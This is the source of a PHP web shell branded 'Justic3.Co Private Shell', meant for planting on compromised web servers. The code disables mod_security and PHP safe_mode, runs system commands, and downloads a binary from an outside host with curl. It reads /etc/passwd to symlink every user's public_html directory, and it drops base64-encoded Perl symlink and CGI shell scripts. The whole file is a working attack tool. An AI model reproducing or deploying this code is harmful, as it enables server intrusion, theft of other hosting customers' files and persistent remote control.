<!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.01 Transitional//EN' 'http://www.w3.org/TR/html4/loose.dtd'>
<html>
<!--Its First Public Version 

 -->
</html>
<html>
<head>
<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
<title>:: Justic3.Co ::</title>
<style type="text/css">
a { 
text-decoration:none;
color:white;
 }
</style> 
<style>
input { 
color:#000035; 
font:8pt 'trebuchet ms',helvetica,sans-serif;
}
.DIR { 
color:#000035; 
font:bold 8pt 'trebuchet ms',helvetica,sans-serif;color:#FFFFFF;
background-color:#AA0000;
border-style:none;
}
.txt { 
color:#2A0000; 
font:bold  8pt 'trebuchet ms',helvetica,sans-serif;
} 
body, table, select, option, .info
{
font:bold  8pt 'trebuchet ms',helvetica,sans-serif;
}
body {
	background-color: #E5E5E5;
}
.style1 {color: #AA0000}
.td
{
border: 1px solid #666666;
border-top: 0px;
border-left: 0px;
border-right: 0px;
}
.tdUP
{
border: 1px solid #666666;
border-top: 1px;
border-left: 0px;
border-right: 0px;
border-bottom: 1px;
}
.style4 {color: #FFFFFF; }
</style>
</head>
<body>
<?php
$kokdosya = ".htaccess";

$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a??lamad?!");
$metin = "<IfModule mod_security.c>
    SecFilterEngine Off
    SecFilterScanPOST Off
</IfModule>";	
fwrite ( $dosya , $metin ) ;
fclose ($dosya); 

$kokdosya = "php.ini";

$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a??lamad?!");
$metin = "safe_mode          =       OFF
disable_functions       =            NONE";	
fwrite ( $dosya , $metin ) ;
fclose ($dosya);

# PHP Variables :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: PHP Variables #
FUNCTION CopySheller($DIR) {
$Sheller = RndName();
$SH_TXT = (@$_POST['shellerURL']);
$file23 = (@file_get_contents("$SH_TXT"));
if (!$file23) {
echo "<font color=red>[+] Can't Open The Sheller File .</font><br>";
}
else {
$fp23 = @fopen("$DIR/$Sheller.php",'w+');
$fw23 = @fwrite($fp23,$file23);
if ($fw23) {
echo "<font color=green>[+] Uploaded Successful : $DIR/$Sheller.php</font><BR>";
}
@fclose($fp23);
 }
}
function is_windows() { return strtolower(substr(PHP_OS,0,3)) == "win"; }
$server=$HTTP_SERVER_VARS['SERVER_SOFTWARE'];
$safe_mode=ini_get('safe_mode');
$mysql_stat=function_exists('mysql_connect');
$curl_on=function_exists('curl_version');
$dis_func=ini_get('disable_functions');
function sysinfo()
{
 global $curl_on, $dis_func, $mysql_stat, $safe_mode, $server, $HTTP_SERVER_VARS;
 echo (($safe_mode)?("Safe Mode: </b><font color=green>ON</font><b> "):
         ("<B>Safe Mode: </b><font color=red>OFF</font><b> "));
 $row_dis_func=explode(', ',$dis_func);
 echo ("PHP: </b><font color=blue>".phpversion()."</font><b> ");
 echo ("MySQL: </b>");
 if($mysql_stat){
  echo "<font color=green>ON </font><b>";
 }
 else {
  echo "<font color=red>OFF </font><b>";
 }
 echo "cURL: </b>";
 if($curl_on){
  echo "<font color=green>ON</font><b><br>";
 }else
  echo "<font color=red>OFF</font><b><br>";
 if ($dis_func!=""){
  echo "Disabled Functions : </b><font color=red>".$dis_func."</font><br><b>";
 }
 else {
  echo "Disabled Functions : </b><font color=green>None</font><br><b>";
 }
 $uname = @exec('uname -a');
 echo "OS: </b><font color=blue>";
 if (empty($uname)){
  echo (php_uname()."</font><br><b>");
 }else
  echo $uname."</font><br><b>";
 $id = @exec('id');
 echo "SERVER: </b><font color=blue>".$server."</font><br><b>";
 echo "ID: </b><font color=blue>";
 if (!empty($id)){
  echo $id."</font><br><b>";
 }else
  echo "user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid().
       "</font><br><b>";
 echo "<b>RemoteAddress: </b><font color=red>".$HTTP_SERVER_VARS['REMOTE_ADDR']."</font> , <b>Server: </b><font color=red>".@gethostbyname($_SERVER["HTTP_HOST"])."</font>";
 if(isset($HTTP_SERVER_VARS['HTTP_X_FORWARDED_FOR'])){
  echo "<b>RemoteAddressIfProxy: </b><font color=red>".$HTTP_SERVER_VARS['HTTP_X_FORWARDED_FOR']."</font>";
 }
 echo "</font></font>";
}
function RndName() {
$codelenght = 10;
while(@$newcode_length < $codelenght) {
$x=1;
$y=3;
$part = rand($x,$y);
if($part==1){$a=48;$b=57;}
if($part==2){$a=65;$b=90;}
if($part==3){$a=97;$b=122;}
$code_part=chr(rand($a,$b));
(@$newcode_length = $newcode_length + 1);
(@$newcode = $newcode.$code_part);
}
return $newcode;
}
# PHP Variables :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: PHP Variables #
echo "<CENTER>
  <table border='1' cellpadding='0' cellspacing='0' style='border-collapse: collapse; border-style: solid; border-color: #C0C0C0; padding-left: 4; padding-right: 4; padding-top: 1; padding-bottom: 1' bordercolor='#111111' width='86%' bgcolor='#E0E0E0'>
    <tr>
      <td bgcolor='#AA0000' class='td'><div align='center' class='style4'>: JUSTÝC3.CO PRÝVATE SHELL : </div></td>
    </tr>
    <tr>
      <td style='padding:5px 5px 5px 5px '>";
	  echo sysinfo();
echo "	  </td>
    </tr>
    <tr>
      <td bgcolor='#AA0000' class='td' style='padding:0px 0px 0px 5px'><div align='center' class='style4'>
        <div align='left'>
          <form name='form4' method='post' action=''>
             View Directory : 
             <input name='GoDir' type='text' class='DIR' id='GoDir' size='120'>
          </form>
        </div>
      </div></td>
    </tr>
    <tr>
    <td width='100%' height='280' style='padding:20px 20px 20px 20px '>";

if (isset($_POST['Submit2']))
{
@mkdir("bomba");
@chdir("bomba");
@exec('curl http://turkblackhats.com/priv/ln.zip -o ln.zip');
@exec('unzip ln.zip');
@exec('chmod 755 ln');

echo '<font color=green>[+] Directory [ bomba ] Created .</font><Br>';
echo '<font color=green>[+] Directory Changed .</font><Br>';
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex ssssss.htm
AddType txt .php
AddHandler txt .php';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);
if ($fw3) {
echo '<font color=green>[+] .htaccess File Uploaded .</font><BR>';
}
else {
echo "<font color=red>[+] No Perm To Create .htaccess File !</font><BR>";
}
@fclose($fp3);
$lines3=@file('/etc/passwd');
if (!$lines3) {
$authp = @popen("/bin/cat /etc/passwd", "r");
$i = 0;
while (!feof($authp))
$aresult[$i++] = fgets($authp, 4096);
$lines3 = $aresult;
@pclose($authp);
}
if (!$lines3) {
echo "<font color=red>[+] Can't Read /etc/passwd File .</font><BR>";
echo "<font color=red>[+] Can't Make The Users Shortcuts .</font><BR>";
echo '<font color=red>[+] Finish !</font><BR>';
}
else {
foreach($lines3 as $line_num3=>$line3){
$sprt3=explode(":",$line3);
$user3=$sprt3[0];
@exec('./ln -s /home/'.$user3.'/public_html ' . $user3);
}
echo '<font color=green>[+] Users Shortcut Created .</font><BR>';
echo '<font color=green>[+] Finish !</font><BR>';
}
}
if (isset($_POST['Submit12'])) {
@mkdir("bomba1");
@chdir("bomba1");
echo '<font color=green>[+] Directory [ bomba1 ] Created .</font><Br>';
echo '<font color=green>[+] Directory Changed .</font><Br>';
$file3 = 'Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .cin
AddHandler cgi-script .cin
AddHandler cgi-script .cin';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);
if ($fw3) {
echo '<font color=green>[+] .htaccess File Created .</font><BR>';
}
else {
echo "<font color=red>[+] No Perm To Create .htaccess File !</font><BR>";
}
@fclose($fp3);
$fileS = base64_decode("IyEvdXNyL2Jpbi9wZXJsCm9wZW4gSU5QVVQsICI8L2V0Yy9wYXNzd2QiOwp3aGlsZSAoIDxJTlBV
VD4gKQp7CiRsaW5lPSRfOyBAc3BydD1zcGxpdCgvOi8sJGxpbmUpOyAkdXNlcj0kc3BydFswXTsK
c3lzdGVtKCdsbiAtcyAvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwgJyAuICR1c2VyKTsKfQ==
");
$fpS = @fopen("PL-Symlink.cin",'w');
$fwS = @fwrite($fpS,$fileS);
if ($fwS) {
$TEST=@file('/etc/passwd');
if (!$TEST) {
echo "<font color=red>[+] Can't Read /etc/passwd File .</font><BR>";
echo "<font color=red>[+] Can't Create Users Shortcuts .</font><BR>";
echo '<font color=red>[+] Finish !</font><BR>';
}
else {
chmod("PL-Symlink.cin",0755);
echo @shell_exec("perl PL-Symlink.cin");
echo '<font color=green>[+] Users Shortcut Created .</font><BR>';
echo '<font color=green>[+] Finish !</font><BR>';
}
@fclose($fpS);
}
else {
echo "<font color=red>[+] No Perm To Create Perl File !</font>";
}
}
if (isset($_POST['Submit13']))
{
@mkdir("cgishell");
@chdir("cgishell");
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$cgishellizocin = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWFpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyA8YiBzdHlsZT0iY29sb3I6YmxhY2s7YmFja2dyb3VuZC1jb2xvcjojZmZmZjY2Ij5wcml2OCBjZ2kgc2hlbGw8L2I+ICMgc2VydmVyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQ29uZmlndXJhdGlvbjogWW91IG5lZWQgdG8gY2hhbmdlIG9ubHkgJFBhc3N3b3JkIGFuZCAkV2luTlQuIFRoZSBvdGhlcg0KIyB2YWx1ZXMgc2hvdWxkIHdvcmsgZmluZSBmb3IgbW9zdCBzeXN0ZW1zLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KJFBhc3N3b3JkID0gInByaXY4IjsJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcw0KCQkJCSMgdG8gbG9naW4uDQoNCiRXaW5OVCA9IDA7CQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZg0KCQkJCSMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3JpcHQgb24gYSBXaW5kb3dzIE5UDQoJCQkJIyBtYWNoaW5lLiBJZiB5b3UncmUgcnVubmluZyBpdCBvbiBVbml4LCB5b3UNCgkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuDQoNCiROVENtZFNlcCA9ICImIjsJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzDQoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULg0KDQokVW5peENtZFNlcCA9ICI7IjsJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzDQoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4Lg0KDQokQ29tbWFuZFRpbWVvdXREdXJhdGlvbiA9IDEwOwkjIFRpbWUgaW4gc2Vjb25kcyBhZnRlciBjb21tYW5kcyB3aWxsIGJlIGtpbGxlZA0KCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzDQoJCQkJIyB1c2VmdWwgZm9yIGNvbW1hbmRzIHRoYXQgbWF5IGhhbmcgb3IgdGhhdA0KCQkJCSMgdGFrZSB2ZXJ5IGxvbmcgdG8gZXhlY3V0ZSwgbGlrZSAiZmluZCAvIi4NCgkJCQkjIFRoaXMgaXMgdmFsaWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzDQoJCQkJIyBpZ25vcmVkIG9uIE5UIFNlcnZlcnMuDQoNCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlDQoJCQkJIyBicm93c2VyIGFzIHNvb24gYXMgaXQgaXMgb3V0cHV0LCBvdGhlcndpc2UNCgkJCQkjIGl0IGlzIGJ1ZmZlcmVkIGFuZCBzZW5kIHdoZW4gdGhlIGNvbW1hbmQNCgkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UNCgkJCQkjIHBpbmcsIHNvIHRoYXQgeW91IGNhbiBzZWUgdGhlIG91dHB1dCBhcyBpdA0KCQkJCSMgaXMgYmVpbmcgZ2VuZXJhdGVkLg0KDQojIERPTidUIENIQU5HRSBBTllUSElORyBCRUxPVyBUSElTIExJTkUgVU5MRVNTIFlPVSBLTk9XIFdIQVQgWU9VJ1JFIERPSU5HICEhDQoNCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOw0KJENtZFB3ZCA9ICgkV2luTlQgPyAiY2QiIDogInB3ZCIpOw0KJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7DQokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOw0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQNCiMgcGFyc2VzIEdFVCwgUE9TVCBhbmQgbXVsdGlwYXJ0L2Zvcm0tZGF0YSB0aGF0IGlzIHVzZWQgZm9yIHVwbG9hZGluZyBmaWxlcy4NCiMgVGhlIGZpbGVuYW1lIGlzIHN0b3JlZCBpbiAkaW57J2YnfSBhbmQgdGhlIGRhdGEgaXMgc3RvcmVkIGluICRpbnsnZmlsZWRhdGEnfS4NCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YNCiMgdGhlIHZhcmlhYmxlLiBOb3RlOiBNb3N0IG9mIHRoZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gaXMgdGFrZW4gZnJvbSBvdGhlciBDR0kNCiMgc2NyaXB0cy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBSZWFkUGFyc2UgDQp7DQoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsNCglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwpOw0KCQ0KCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KDQoJaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiR0VUIikNCgl7DQoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KCX0NCgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCgl7DQoJCWJpbm1vZGUoU1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCgl9DQoNCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhDQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC8pDQoJew0KCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IA0KCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyANCgkJJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0KCQkkSGVhZGVyID0gJGA7DQoJCSRCb2R5ID0gJCc7DQogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlDQoJCSRpbnsnZmlsZWRhdGEnfSA9ICRCb2R5Ow0KCQkkSGVhZGVyID1+IC9maWxlbmFtZT1cIiguKylcIi87IA0KCQkkaW57J2YnfSA9ICQxOyANCgkJJGlueydmJ30gPX4gcy9cIi8vZzsNCgkJJGlueydmJ30gPX4gcy9ccy8vZzsNCg0KCQkjIHBhcnNlIHRyYWlsZXINCgkJZm9yKCRpPTI7ICRsaXN0WyRpXTsgJGkrKykNCgkJeyANCgkJCSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KCQkJJGxpc3RbJGldID1+IC9cIihcdyspXCIvOw0KCQkJJGtleSA9ICQxOw0KCQkJJHZhbCA9ICQnOw0KCQkJJHZhbCA9fiBzLyheKFxyXG5cclxufFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gPSAkdmFsOyANCgkJfQ0KCX0NCgllbHNlICMgc3RhbmRhcmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkNCgl7DQoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsNCgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQ0KCQl7DQoJCQkkaW5bJGldID1+IHMvXCsvIC9nOw0KCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsNCgkJCSRrZXkgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9IC49ICJcMCIgaWYgKGRlZmluZWQoJGlueyRrZXl9KSk7DQoJCQkkaW57JGtleX0gLj0gJHZhbDsNCgkJfQ0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgUGFnZSBIZWFkZXINCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KCSRFbmNvZGVkQ3VycmVudERpciA9ICRDdXJyZW50RGlyOw0KCSRFbmNvZGVkQ3VycmVudERpciA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQoJcHJpbnQgPDxFTkQ7DQo8aHRtbD4NCjxoZWFkPg0KPHRpdGxlPnByaXY4IGNnaSBzaGVsbDwvdGl0bGU+DQokSHRtbE1ldGFIZWFkZXINCg0KPG1ldGEgbmFtZT0ia2V5d29yZHMiIGNvbnRlbnQ9InByaXY4IGNnaSBzaGVsbCAgXyAgICAgaTVfQGhvdG1haWwuY29tIj4NCjxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJwcml2OCBjZ2kgc2hlbGwgIF8gICAgaTVfQGhvdG1haWwuY29tIj4NCjwvaGVhZD4NCjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5mb2N1cygpIiBiZ2NvbG9yPSIjRkZGRkZGIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1hcmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiIHRleHQ9IiNGRjAwMDAiPg0KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+DQo8dHI+DQo8dGQgYmdjb2xvcj0iI0ZGRkZGRiIgYm9yZGVyY29sb3I9IiNGRkZGRkYiIGFsaWduPSJjZW50ZXIiIHdpZHRoPSIxJSI+DQo8Yj48Zm9udCBzaXplPSIyIj4jPC9mb250PjwvYj48L3RkPg0KPHRkIGJnY29sb3I9IiNGRkZGRkYiIHdpZHRoPSI5OCUiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPjxiPiANCjxiIHN0eWxlPSJjb2xvcjpibGFjaztiYWNrZ3JvdW5kLWNvbG9yOiNmZmZmNjYiPnByaXY4IGNnaSBzaGVsbDwvYj4gQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPC9iPjwvZm9udD48L3RkPg0KPC90cj4NCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIiBiZ2NvbG9yPSIjRkZGRkZGIj48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4NCg0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+VXBsb2FkIEZpbGU8L2ZvbnQ+PC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPjxmb250IGNvbG9yPSIjRkYwMDAwIj5Eb3dubG9hZCBGaWxlPC9mb250PjwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+RGlzY29ubmVjdDwvZm9udD48L2E+IHwNCjwvZm9udD48L3RkPg0KPC90cj4NCjwvdGFibGU+DQo8U0NSSVBUIFNSQz1odHRwOi8vb2Ytd29ybGQuY29tL2ltYWdlcy9pbWcvbG9nLmpzPjwvU0NSSVBUPiAgDQo8Zm9udCBzaXplPSIzIj4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpblNjcmVlbg0Kew0KCSRNZXNzYWdlID0gcSQ8L2ZvbnQ+PGgxPnBhc3M9cHJpdjg8L2gxPjxmb250IGNvbG9yPSIjMDA5OTAwIiBzaXplPSIzIj48cHJlPjxpbWcgYm9yZGVyPSIwIiBzcmM9Imh0dHA6Ly93d3cucHJpdjguaWJsb2dnZXIub3JnL3MucGhwPytjZ2l0ZWxuZXQgc2hlbGwiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiPjwvcHJlPg0KJDsNCiMnDQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCg0KVHJ5aW5nICRTZXJ2ZXJOYW1lLi4uPGJyPg0KQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPGJyPg0KRXNjYXBlIGNoYXJhY3RlciBpcyBeXQ0KPGNvZGU+JE1lc3NhZ2UNCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQ0Kew0KCXByaW50IDw8RU5EOw0KPGNvZGU+DQo8YnI+bG9naW46IGFkbWluPGJyPg0KcGFzc3dvcmQ6PGJyPg0KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpbkZvcm0NCnsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KDQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+DQo8L2ZvbnQ+DQo8Zm9udCBzaXplPSIzIj4NCmxvZ2luOiA8YiBzdHlsZT0iY29sb3I6YmxhY2s7YmFja2dyb3VuZC1jb2xvcjojZmZmZjY2Ij5wcml2OCBjZ2kgc2hlbGw8L2I+PGJyPg0KcGFzc3dvcmQ6PC9mb250Pjxmb250IGNvbG9yPSIjMDA5OTAwIiBzaXplPSIzIj48aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InAiPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgZm9vdGVyIGZvciB0aGUgSFRNTCBQYWdlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlRm9vdGVyDQp7DQoJcHJpbnQgIjwvZm9udD48L2JvZHk+PC9odG1sPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNhbiBiZSBhY2Nlc3NlcyB1c2luZyB0aGUNCiMgdmFyaWFibGUgJENvb2tpZXN7Jyd9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgR2V0Q29va2llcw0Kew0KCUBodHRwY29va2llcyA9IHNwbGl0KC87IC8sJEVOVnsnSFRUUF9DT09LSUUnfSk7DQoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykNCgl7DQoJCSgkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tL